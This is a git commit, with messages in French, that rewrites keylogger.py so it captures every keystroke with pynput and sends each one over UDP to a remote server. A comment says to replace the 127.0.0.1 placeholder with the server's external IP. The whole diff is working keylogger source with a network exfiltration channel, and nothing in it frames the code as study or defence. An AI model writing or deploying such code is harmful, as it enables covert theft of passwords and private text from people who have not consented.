c7122865b27a0646ec63cd54fa54c11992407284
SDW46364 <117464397+SDW46364@users.noreply.github.com>
2022-11-06 19:24:17 +0100

    Modification De Waal Sami
    Je rends le code principal utilisable

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,27 @@
+import socket
 from pynput.keyboard import Listener
-import logging
 
-print("\n\tKEYLOGGER en marche!")
+# définition de l'adresse du serveur auquel envoyer les données
+# remplacer par l'ip externe du serveur
+host = "127.0.0.1"
 
-file = "log.txt"
-logging.basicConfig(filename=file, level=logging.INFO, format="%(asctime)s %(message)s")
+port = 8888
+server = (host, port)
 
+print("KEYLOGGER en marche!")
+
+# création du socket : utilisation du protocole UDP
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# définition de la fonction qui envoie les données au serveur
+# et qui est appelée à chaque frappe de touche
 def on_press(key):
-    logging.info(key)
-    print("KEYLOGGER INFO : ", key)
+    # convertit le nom de la touche appuyée en chaine de caractères avec l'encodage utf-8
+    data = str(key).encode("utf-8")
 
+    # on envoie la touche pressée au serveur
+    sock.sendto(data, server)
+
+# enregistrement de l'observateur de frappe
 with Listener(on_press=on_press) as listener:
     listener.join()
